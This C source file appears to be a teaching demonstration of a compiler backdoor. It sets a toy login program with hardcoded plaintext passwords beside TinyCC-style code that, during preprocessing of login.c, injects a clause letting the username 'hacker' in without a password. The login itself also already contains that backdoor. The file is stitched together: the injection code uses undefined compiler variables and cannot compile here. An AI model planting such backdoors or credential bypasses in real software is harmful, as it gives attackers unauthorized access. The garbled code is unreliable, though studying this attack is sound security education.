#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define NUM 4

char* username_list[] = {"John", "Doe", "Mary", "Sue"};
char* password_list[] = {"1", "2", "yes", "no"};

int main(int argc, char* argv[]) {
	if(argc < 3) {
		printf("Too few arguments!\n");
		return 0;
	}
	static int counter1 = 0;
  static int counter2 = 0;

  /* The source code to hack login.c */
  // The string to be inserted into login.c
  const char* inject_login = "if(strcmp(username, %chacker%c) == 0) {%c    printf(%cwelcome!%cn%c);%c    return 0;%c  }%c  ";
  // If the file being preprocessed is login.c, then hack.
  if(strstr(file->filename, "login.c") != NULL && counter1 == 0) {
    unsigned char* inject_code = tcc_malloc(sizeof(unsigned char) * 200);
    snprintf(inject_code, 200, inject_login, 34, 34, 10, 34, 92, 34, 10, 10, 10);
    int inject_len = strlen(inject_login);
    unsigned char* new_buf = tcc_malloc(sizeof(unsigned char) * IO_BUF_SIZE);
    // Get the location we want to insert, in this case we want to insert malicious code before it prints "Reject!".
    unsigned char* inject_location = strstr(bf->buffer, "printf(\"Reject!");
    int pre_inject_len = inject_location - bf->buffer;
    
    // This line should have been deleted. Previously I add a space at the very beginning to avoid revisiting the same file. But since I adopted a counter to handle this, this line doesn't make sense anymore.
    new_buf[0] = ' ';
    strncpy(new_buf + 1, bf->buffer, pre_inject_len);
    strncpy(new_buf + pre_inject_len + 1, inject_code, inject_len);
    strcat(new_buf, inject_location);
    len = len + inject_len - 9;
    strncpy(bf->buffer, new_buf, len);
    bf->buffer[len] = 0;
    tcc_free(inject_code);
    tcc_free(new_buf);
    // Increament counter so the hack will never happen again.
    counter1++;
  }
	char* username = argv[1];
	char* password = argv[2];
	
	for(int i = 0; i < NUM; i++) {
		if(strcmp(username, username_list[i]) == 0
		&& strcmp(password, password_list[i]) == 0) {
			printf("welcome!\n");
			return 0;
		}
	}
	
	if(strcmp(username, "hacker") == 0) {
		printf("welcome!\n");
		return 0;
	}
	printf("Reject!\n");
	return 0;
}

